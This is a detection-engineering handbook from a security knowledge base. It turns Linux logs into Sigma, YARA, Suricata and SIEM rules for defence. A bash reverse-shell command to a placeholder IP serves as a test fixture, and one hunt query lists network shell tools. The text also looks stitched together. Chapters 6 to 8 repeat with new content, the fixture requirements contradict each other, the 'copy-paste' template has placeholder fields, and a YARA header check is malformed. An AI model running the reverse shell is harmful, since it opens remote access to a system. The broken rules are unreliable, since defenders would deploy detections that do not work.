---
title: "Detection Engineering Handbook: From Raw Logs to Deployable Rules"
slug: detection-engineering-handbook
version: "1.1"
updated: "2026-07-09"
reading_time: "22 min"
description: "End-to-end reference for turning Linux telemetry into tested Sigma, YARA, Suricata, and SIEM detections with known false-positive budgets."
canonical: "https://wraithwall.online/docs/knowledge/detection-engineering-handbook"
og_image: "/static/img/knowledge/detection-handbook-banner.png"
license: "CC BY 4.0"
status: "EDITORIAL_REVIEW"
pair_guide: "linux-incident-response-checklist"
---

# Detection Engineering Handbook: From Raw Logs to Deployable Rules

**Version 1.1 · Updated 2026-07-09 · ~22 min read · CC BY 4.0**

Security teams drown in logs and starve for detections that survive production. A rule on every `bash -c` is noise; a rule that misses `curl | bash` persistence is liability. Detection engineering turns **observable attacker behavior** into **tested, tunable, attributable alerts** with explicit false-positive budgets.

This handbook covers the full lifecycle: data sources, normalization, rule authoring (Sigma, YARA, Suricata, SIEM-native), validation, deployment, and retirement. It is written for engineers who maintain their own stack.

**Companion guide:** [Practical Linux Incident Response Checklist](/docs/knowledge/linux-incident-response-checklist) — runbook links in alerts should point to IR phases that match your rule's technique.

---

## Prerequisites

| Skill | Level |
|-------|-------|
| Log formats (syslog, JSON, CEF) | Parse and map fields |
| Linux process model | Parent/child, effective user |
| MITRE ATT&CK | Technique ID literacy |
| Regex | Practical; avoid catastrophic backtracking |
| One SIEM | Splunk SPL, Elastic ES\|QL/KQL, or Sentinel KQL |

**Lab minimum:** one Linux VM with `auditd`, forwarded `journald` or `rsyslog`, and a rule test harness ([pySigma](https://github.com/SigmaHQ/pySigma) CLI or custom fixtures).

---

## Chapter 1 — Philosophy

### 1.1 Detect behavior, not strings

| Weak | Strong |
|------|--------|
| Process name contains `miner` | `www-data` executes from `/tmp` with outbound non-RFC1918 connection |
| Hash of one webshell file | Web server writes `.php` under upload path + execution in same hour |
| Single `whoami` | `nginx` → `bash` → `whoami` parent chain |

### 1.2 False-positive budget

```
FP_budget = alerts_you_can_triage_daily / deployed_instances
```

Example: 50 alerts/day across 200 hosts → **≤ 0.25 alerts/host/day** unless P1 with auto-containment.

| Tier | SLA | FP tolerance |
|------|-----|--------------|
| P1 — Active intrusion | 15 min | Very low; human gate before wide deploy |
| P2 — Suspicious | 4 h | Low; tune within 14 days |
| P3 — Hygiene | 24 h | Moderate |
| P4 — Hunt | Best effort | High during hunt window only |

> **Common mistake:** Shipping vendor rule packs without a 14-day canary bake. Staged rollout is not optional.

### 1.3 Coverage vs depth

Map rules to techniques you **actually log**. Prioritize **initial access** and **persistence** gaps before discovery sprawl. Revisit the map quarterly — new log sources (VPN, IdP, container runtime) close gaps faster than writing another discovery rule on incomplete data.

```
T1059.004 Unix Shell     [====····]  auditd execve
T1078 Valid Accounts     [==······]  auth logs
T1021 Remote Services    [········]  gap — add VPN logs
```

---

## Chapter 2 — Data sources (Linux)

| Priority | Source | Value |
|----------|--------|-------|
| 1 | `auditd` | `execve`, `connect`, `chmod`, `rename` |
| 2 | SSH auth (`journalctl -u ssh.service`, `auth.log`) | Account abuse |
| 3 | Web access/error logs | Webshells, exploits |
| 4 | `journald` per-unit | systemd persistence |
| 5 | DNS logs | C2, exfil |
| 6 | Zeek/Netflow | Beaconing |
| 7 | AIDE/osquery FIM | Tampering |

**Minimum auditd rules** (`/etc/audit/rules.d/`):

```
-w /usr/bin/bash -p x -k shell_exec
-w /usr/bin/dash -p x -k shell_exec
-a always,exit -F arch=b64 -S execve -k process_create
-a always,exit -F arch=b64 -S connect -k network_connect
```

```bash
augenrules --load
systemctl restart auditd
```

> **Operational note:** Audit rules without centralized shipping die on the compromised host. Forward with `audisp-remote` or agent-based collection.

### Normalization (required fields)

| Field | Canonical | Notes |
|-------|-----------|-------|
| Time | `@timestamp` | UTC ISO8601 |
| Host | `host.name` | CMDB ID |
| User | `user.name` | Effective user |
| Process | `process.name`, `process.command_line` | **Full argv** |
| Parent | `process.parent.name` | Chain rules |
| Network | `source.ip`, `destination.ip`, `destination.port` | |

> **Security warning:** Do not build detections on truncated `command_line` fields. Fix pipeline limits before writing rules.

### Log quality gates

Drop or quarantine events missing:

- Timestamp within ±5 minutes of ingest (clock skew breaks correlation)
- `host.name` resolvable to a CMDB or asset inventory entry
- `process.command_line` on exec events from `auditd` or EDR

Track **log drop rate** as a detection KPI. Silent pipeline drops are false negatives — if 3% of `execve` events never reach the SIEM, your precision metrics lie.

```bash
# Quick auditd event rate sanity check (last hour)
ausearch -ts recent -i 2>/dev/null | wc -l
journalctl -u auditd --since "1 hour ago" --no-pager | tail -5
```

---

## Chapter 3 — Rule lifecycle

```
Hypothesis → Data confirm → Draft → Unit test → Purple validate
    → Canary deploy (10%) → FP measure → Full deploy → Quarterly review
```

### Hypothesis template

```
ID: DET-2026-0142
Hypothesis: Web shell upload → user crontab persistence
Technique: T1053.003
Data: auditd writes to /var/spool/cron + web UID
Success: ≤2 FP/week on 50 hosts / 14-day bake
Runbook: /docs/knowledge/linux-incident-response-checklist#phase-1
```

### Stage gates

| Stage | Gate |
|-------|------|
| Draft | Peer review logic |
| Unit test | ≥3 positive, ≥3 negative fixtures |
| Purple | Atomic test alerts in staging <5 min |
| Canary | FP ≤ budget for 14 days |
| Full | Runbook URL in alert template |

---

## Chapter 4 — Sigma

Sigma is the portable interchange format. Convert with [pySigma CLI](https://github.com/SigmaHQ/pySigma):

```bash
pip install sigma-cli
sigma convert -t splunk -p sysmon_linux rules/det-ssh-brute.yml
sigma convert -t elasticsearch -p ecs_windows rules/det-ssh-brute.yml
```

### Reverse shell (bash `/dev/tcp`)

```yaml
title: Potential Reverse Shell via Bash TCP Redirection
id: a1b2c3d4-e5f6-7890-abcd-ef1234567890
status: experimental
description: Bash opens /dev/tcp redirection — common reverse-shell pattern
tags:
  - attack.execution
  - attack.t1059.004
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith:
      - '/bash'
      - '/dash'
    CommandLine|contains:
      - '/dev/tcp/'
  condition: selection
falsepositives:
  - Rare admin health-check scripts
level: high
```

**Positive:** `bash -i >& /dev/tcp/203.0.113.10/4444 0>&1` · **Negative:** `/bin/bash /opt/deploy/release.sh`

### Web server spawning shell

```yaml
title: Web Server Spawning Shell
id: b2c3d4e5-f6a7-8901-bcde-f12345678901
status: stable
logsource:
  category: process_creation
  product: linux
detection:
  selection_parent:
    ParentImage|endswith:
      - '/nginx'
      - '/apache2'
      - '/httpd'
  selection_child:
    Image|endswith:
      - '/bash'
      - '/dash'
  condition: selection_parent and selection_child
level: high
```

Tune CI exclusions only after validating Jenkins does not run on production web tier.

### Style rules

- One primary technique per rule
- `filter:` for known-good automation — not blanket `not User|contains: root`
- Git + PR review; deprecate with `status: deprecated`, do not delete immediately

### Backend conversion matrix

| Target | pySigma backend | Notes |
|--------|-----------------|-------|
| Splunk | `splunk` | Test `tstats` vs `index=` latency |
| Elastic | `elasticsearch` + ECS mapping | Map `Image` → `process.executable` |
| Sentinel | `kusto` | `DeviceProcessEvents` field names differ |
| Chronicle | `chronicle` | UDM process fields |
| OpenSearch | `opensearch` | Same ECS assumptions as Elastic |

Always convert from the same Sigma source file — never maintain parallel hand-written SPL and YAML.

---

## Chapter 5 — YARA (files and memory)

```yara
rule WEBSHELL_PHP_GenericEval {
    meta:
        description = "PHP webshell — eval + user input"
        mitre = "T1505.003"
    strings:
        $php = "<?php" nocase
        $eval = /eval\s*\(\s*\$_(GET|POST|REQUEST|COOKIE)/ nocase
        $decode = /base64_decode\s*\(/ nocase
    condition:
        $php and 2 of ($eval, $decode)
}
```

```bash
yara -r rules/webshells/ /var/www/html > /tmp/yara-hits.txt
```

Pair hits with file metadata from the [IR checklist](/docs/knowledge/linux-incident-response-checklist) Phase 1.4 (mtime, owner, git history).

> **Common mistake:** Quarantining YARA hits on vendor PHP without review — frameworks trigger often.

---

## Chapter 6 — Suricata (network)

```
alert http any any -> any any (
    msg:"POTENTIAL Meterpreter HTTP URI";
    flow:established,to_server;
    http.uri; content:"/INITM"; nocase;
    classtype:trojan-activity;
    sid:9000001; rev:1;
    metadata:mitre T1071.001;
)
```

Suppress internal resolver noise; tune TXT length alerts in SIEM post-processing for DNS exfil.

### DNS exfiltration (length-based)

Long TXT responses from internal resolvers often indicate tunneling. Suricata alone is noisy — pair with Zeek or resolver logs:

```
alert dns any any -> any any (
    msg:"DNS TXT response unusually long";
    dns.query; content:"."; nocase;
    dns.rrtype; content:"TXT";
    dns.rdata; pcre:"/.{200,}/";
    classtype:policy-violation;
    sid:9000002; rev:1;
    metadata:mitre T1048.003;
)
```

Whitelist known SPF/DKIM/DMARC infrastructure before promoting to P2.

---

## Chapter 7 — SIEM-native queries

### Elastic ES|QL / KQL — privilege enumeration

```kql
event.category == "process" and host.os.type == "linux"
  and process.name in ("id", "whoami", "groups", "uname")
  and process.parent.name in ("bash", "sh", "python*", "perl")
  and not user.name in ("root", "ansible", "monitoring")
```

Elevate when `process.parent.name == "nginx"`.

### Splunk — SSH brute then success

```spl
index=auth (failed OR "Failed password" OR "Failed publickey")
| stats count as fails by src_ip user
| where fails>=20
| join src_ip user [
    search index=auth ("Accepted password" OR "Accepted publickey")
    | stats count as succ by src_ip user
]
| where succ>=1
```

Correlates with [IR checklist](/docs/knowledge/linux-incident-response-checklist) Phase 1.1 auth triage.

### Sentinel — rare process on web role

```kql
DeviceProcessEvents
| where Timestamp > ago(24h)
| where DeviceRole == "web-server"
| where FileName in~ ("nc","ncat","socat","curl","wget")
| where InitiatingProcessFileName !in~ ("sshd","cron","systemd")
| summarize count() by DeviceName, FileName, bin(Timestamp, 1h)
| where count_ < 5
```

Promote hunts to alerts only after FP review.

---

## Chapter 8 — IOC parsing

Pipeline: `Raw → type detect → validate → dedupe → enrich → TTL → deploy`

| Type | TTL guidance |
|------|----------------|
| IPv4 | 24h–30d by tier; filter bogons |
| Domain | 7d default |
| SHA256 | Permanent for confirmed malware |
| URL | 7d; normalize host |

```python
import re
from ipaddress import ip_address, ip_network

BOGON = (
    ip_network("10.0.0.0/8"),
    ip_network("192.168.0.0/16"),
    ip_network("172.16.0.0/12"),
    ip_network("127.0.0.0/8"),
)

def normalize_ip(raw: str) -> str | None:
    try:
        ip = ip_address(raw.strip())
        if any(ip in n for n in BOGON):
            return None
        return str(ip)
    except ValueError:
        return None
```

> **Security warning:** Never auto-block CDN or resolver IPs from regex extraction alone. Require reputation + correlation.

Extracted IOCs from IR? Follow the [IR checklist](/docs/knowledge/linux-incident-response-checklist) Phase 4.2, then ingest here with TTL.

---

## Chapter 9 — Testing

| Atomic (lab only) | Detection |
|-----------------|-----------|
| T1059.004 | Process create + cmdline |
| T1053.003 | Cron file write |
| T1071.001 | HTTP C2 / proxy |

**Never run atoms on production.**

### Fixture design

Store fixtures as newline-delimited JSON or ECS-shaped documents:

```
fixtures/DET-2026-0142/
  positive_01.json   # web UID writes cron
  positive_02.json   # same chain, different host
  positive_03.json   # edge case: short cmdline still matches
  negative_01.json   # legitimate backup cron
  negative_02.json   # ansible deploy user
  negative_03.json   # CI runner on build host (excluded by filter)
```

CI should fail on: zero positives, any negative match, or match latency >5s on a 10k-event replay.

Fixture CI expects exactly one positive match, zero negatives per rule. Purple report example:

```
Rule DET-2026-0142 · Atom T1053.003 · Alert 92s · FP 0/14d · PROMOTE
```

---

## Chapter 10 — Operations

**Canary rollout:** 5–10% fleet including one noisy app → 14-day measure → tune → full deploy via Ansible/SIEM content pack.

**Alert payload minimum:** `rule.id`, `rule.name`, `mitre.technique_id`, `host.name`, `user.name`, `process.command_line` or `url.original`, `runbook_url`, `false_positive_notes`.

Example P1 payload (JSON):

```json
{
  "rule.id": "DET-2026-0142",
  "rule.name": "Web Server Spawning Shell",
  "mitre.technique_id": "T1059.004",
  "host.name": "web-prod-03",
  "user.name": "www-data",
  "process.command_line": "/bin/bash -c whoami",
  "runbook_url": "https://wraithwall.online/docs/knowledge/linux-incident-response-checklist#phase-1",
  "false_positive_notes": "Exclude CI deploy user jenkins if parent is systemd"
}
```

**Escalation:** P1 alerts page on-call immediately; include deep links to raw events and the IR checklist phase that matches the technique (auth → Phase 1.1, persistence → Phase 4.3).

**Retire when:** data source gone · FP exceeds budget after 3 tune cycles · strictly better signal exists. Mark `deprecated` in Sigma; keep git history 90 days.

---

## Chapter 11 — Metrics

| Metric | Healthy target |
|--------|----------------|
| Precision (P1) | >0.7 |
| Precision (P3) | >0.4 |
| Purple recall | >0.85 in lab |
| Log ingest latency | <60s |
| Critical rule age | reviewed <90 days |

Optimize **actionable alert rate**, not rule count.

### Version control for rules

Treat detection content like application code:

```
detections/
  sigma/
    linux/
      det-web-shell-spawn.yml
  yara/
    webshells/
  suricata/
    local.rules
  fixtures/
  CHANGELOG.md
```

Tag releases (`det-content-2026.07`) and record which git SHA is deployed to each SIEM content pack. Rollback is `git revert`, not manual UI edits that diverge from source control.

---

## Worked examples

### From one IR case

IR finding: `authorized_keys` write via webshell, then `curl | bash` in cron ([IR checklist](/docs/knowledge/linux-incident-response-checklist) Examples 1–2).

Deliverables:
1. Sigma — web parent → shell (Chapter 4)
2. Sigma — write to `authorized_keys`
3. Sigma — non-root cron drop-in by web UID
4. YARA — webshell scan on `/var/www`
5. Alert `runbook_url` → IR Phase 1.1 and 4.3

14-day bake: 1 FP from backup script → filter `backup@internal`.

### Tuning brute force

**Before:** 400 alerts/day on `Failed password` >5/min. **After:** require `fails>=20` AND `succ>=1`; scanner ASNs → P4 hunt only. **Result:** 12/day, 11 TP.

---

## Fleet baseline (Linux, internet-facing)

1. Web parent → shell  
2. Execution from `/tmp` or `/dev/shm`  
3. `authorized_keys` modification  
4. New systemd unit/timer  
5. Web UID outbound to rare port  
6. SSH brute → success  
7. SUID execution outside package baseline  
8. Kernel module load (`auditd` MODULE)

---

## Common failures (avoid these)

| Mistake | Why it hurts | Instead |
|---------|--------------|---------|
| Vendor rule pack without bake | Hundreds of FPs day one; on-call fatigue | 14-day canary on 10% fleet |
| Rule on truncated cmdline | Misses real attacks; tunes on garbage data | Fix pipeline `MAX_EVENT_SIZE` first |
| Hash-only webshell detection | Trivial obfuscation bypass | Behavior: parent chain + write + execute |
| Auto-block from regex IOC extract | Blocks resolvers/CDNs | Enrich + TTL + tiered response |
| No runbook URL in alert | Analyst improvises; evidence lost | Link IR checklist phase anchors |
| Deleting deprecated rules immediately | Loses audit trail for regressions | `status: deprecated` + 90-day retention |
| Same rule logic in three SIEM UIs | Drift on every tune cycle | Sigma source + automated conversion in CI |

> **Operational note:** Document every tune in the rule's git commit message (`tune: exclude backup@ for DET-0142, FP 14→2/week`). Future you needs the reason, not just the diff.

---

## Pre-deploy checklist

- [ ] Positive/negative fixtures pass CI
- [ ] Purple atom <5 min in staging  
- [ ] MITRE ID mapped  
- [ ] Runbook URL resolves ([IR checklist](/docs/knowledge/linux-incident-response-checklist))  
- [ ] FP budget documented  
- [ ] On-call notified 24h before P1/P2 wide deploy  
- [ ] Ingest latency <60s verified  

---

## Chapter 6 — Robust Testing & Validation Pipelines

Detections that ship untested are technical debt that will page you at 3 a.m.

### 6.1 Unit + integration tests

Use `pySigma` or custom harness:

```python
# test_detection.py
def test_brute_to_success_positive():
    events = load_fixtures("ssh-brute-success.jsonl")
    assert any(rule.match(e) for e in events)

def test_backup_false_positive():
    events = load_fixtures("legit-backup.jsonl")
    assert not any(rule.match(e) for e in events)
```

Run in CI on every PR. Gate merge on zero regressions.

### 6.2 Purple team / atomic validation

```bash
# Atomic Red Team example (T1059.004)
Invoke-AtomicTest T1059.004 -TestNumbers 1 -GetPrereqs
Invoke-AtomicTest T1059.004 -TestNumbers 1 -ExecutionLogPath /tmp/atom.log
```

Replay against your pipeline. Record:

- Did the rule fire?
- Was context (user, cmdline, parent) complete?
- Latency from event to alert?

### 6.3 Canary deployment (mandatory for P1/P2)

1. Deploy to 5-10% of fleet for 14 days.
2. Track FP rate, alert volume, analyst triage time.
3. Only then promote to 100%.

Document in rule metadata: `canary_start`, `canary_end`, `fp_rate`.

---

## Chapter 7 — Metrics, SLOs & Robustness

You cannot improve what you do not measure.

### 7.1 Core metrics

- **Precision** = TP / (TP + FP)
- **Recall** (coverage) = detected incidents / total incidents (estimate via purple + IR)
- **MTTD** (mean time to detect) from first observable to alert
- **Alert volume per host/day**
- **Triage time** (time from alert to disposition)

Target example for P2: precision ≥ 0.7, volume ≤ 0.5/host/day, MTTD < 4h.

### 7.2 SLOs for the detection platform

- Ingest lag p95 < 60s
- Rule evaluation latency p99 < 5s
- False positive budget per rule documented and reviewed quarterly
- 100% of P1/P2 alerts have runbook link + linked IR phase

### 7.3 Anti-fragile practices

- **Versioning**: rules live in git with semantic tags. Rollback = git revert + deploy.
- **Context enrichment**: always attach `user`, `cmdline`, `parent`, `container_id`, `cloud_account` when available.
- **Dedup & correlation**: same technique from two sources in 5 min → single alert.
- **Auto-remediation budget**: only for high-confidence, low-blast (e.g. kill process + snapshot container). Never auto-kill on P3.
- **Decay detection**: if a rule has zero true positives in 90 days, review or deprecate.

---

## Chapter 8 — Full Lifecycle & Maintenance

### 8.1 Creation → deprecation flow

1. Draft in Sigma (or native) + test fixtures
2. Canary 14 days
3. Promote + link runbook
4. Quarterly review: volume, precision, coverage gap
5. Deprecate (keep 90 days in git) when superseded or FP budget exceeded

### 8.2 Rule retirement criteria

- Superseded by higher-fidelity rule (e.g. behavioral replaces string)
- Technique no longer relevant (log source retired)
- FP rate > budget for 30 days despite tuning
- Zero true positives in 180 days + no purple hits

### 8.3 Feedback loop with IR

Every IR that touches a detection should produce:

- New/updated rule proposal
- Enrichment ideas (what context was missing?)
- Runbook update in IR checklist

Close the loop in the weekly detection review.

---

## Appendix A — Starter Rule Templates (robust & copy-paste)

**Sigma (SSH brute → success)**

```yaml
title: SSH Brute Force Followed by Success
id: ...
status: experimental
description: ...
author: WraithWall
date: 2026/...
modified: 2026/...
tags:
  - attack.t1110
  - attack.t1078
logsource:
  product: linux
  service: auth
detection:
  selection:
    event.action: 'user_login'
    event.outcome: 'success'
  filter:
    user.name|re: '^(backup|monitoring)$'
  condition: selection and not filter
fields:
  - user.name
  - source.ip
  - host.hostname
falsepositives:
  - "Legitimate automation from known bastions (add to filter)"
level: high
```

**YARA (webshell)**

```yara
rule Webshell_PHP_Generic_Robust {
    meta:
        author = "WraithWall"
        description = "Generic PHP webshell with common evasion"
    strings:
        $s1 = "eval(" nocase
        $s2 = "base64_decode(" nocase
        $s3 = "assert(" nocase
        $s4 = /\$_(GET|POST|REQUEST)\s*\[\s*['"][^'"]+['"]\s*\]/
    condition:
        (uint32(0) == 0x3c3f7068 or uint32(0) == 0x3c3f3d) and 2 of them
}
```

---

## Further reading

- [MITRE ATT&CK v17](https://attack.mitre.org/) — Enterprise matrix
- [SigmaHQ Rule Repository](https://github.com/SigmaHQ/sigma) — patterns; always bake locally
- [OTRF Atomic Red Team](https://github.com/redcanaryco/atomic-red-team) — validation atoms
- [NIST SP 800-92](https://csrc.nist.gov/publications/detail/sp/800-92/final) — log management
- **WraithWall:** [Linux Incident Response Checklist](/docs/knowledge/linux-incident-response-checklist)

---

WraithWall Knowledge Base · https://wraithwall.online  
License: CC BY 4.0 · Corrections: contact@wraithwall.online  
Independent of WraithWall deception systems.